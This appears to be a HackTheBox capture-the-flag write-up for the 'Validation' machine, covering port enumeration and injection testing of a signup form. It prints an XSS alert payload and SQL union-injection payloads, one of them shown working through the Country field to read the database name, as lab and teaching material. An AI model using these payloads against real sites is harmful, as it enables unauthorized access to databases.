# Validation HacktheBox

**ENUMERATION**

**NMAP**

![image](https://user-images.githubusercontent.com/79543461/177142512-ca4b0e81-c4bd-4cae-a65e-6dc6976a7242.png)

**Port 80**

![image](https://user-images.githubusercontent.com/79543461/177142701-0be496f1-60ba-4fed-871d-836ca8352fb7.png)

**Port 4566**

![image](https://user-images.githubusercontent.com/79543461/177142777-127ce58a-10c2-4d35-99cd-904be4e79abd.png)

**Port 8080**

![image](https://user-images.githubusercontent.com/79543461/177142844-5600bb65-4f47-4ae9-8d4c-e20eaca2a966.png)

I enumerate Port 80:

![image](https://user-images.githubusercontent.com/79543461/177143065-83faf0c0-e186-40e3-aac5-4011e709f972.png)

**First Attack Vectors**

The index page of this web it's a form to qualify for something called September UHC, let's try to inject code SQL,XSS,HTML and more.

**XSS**

Payload: <script>alert("SS")</script>

![image](https://user-images.githubusercontent.com/79543461/177160817-3203a467-57bd-4bb6-ab4a-50d45508fc1c.png)

**It's Vulnerable to XSS and HTML Injection, but i can't do anything**

**SQLI**

**BurpSuite**

Payload: ' order by 10000-- - == **NO WORK**

Payload: ' union select 1-- - == **NO WORK**

**Country Field**

Let's try to do this payloads with other field from request.

Payload: ' union select 1-- - == **WORKS!!!!!**

![image](https://user-images.githubusercontent.com/79543461/177161840-7352bb95-c77b-451d-9b9f-8d3d785baed2.png)

![image](https://user-images.githubusercontent.com/79543461/177162100-a0e026a4-6b8d-4f35-b056-161b90c9238e.png)

Let's go to enumerate Things.

**Database**

Payload: ' union select database()-- -

![image](https://user-images.githubusercontent.com/79543461/177163576-b903824d-3109-4143-b421-39d210096c0e.png)



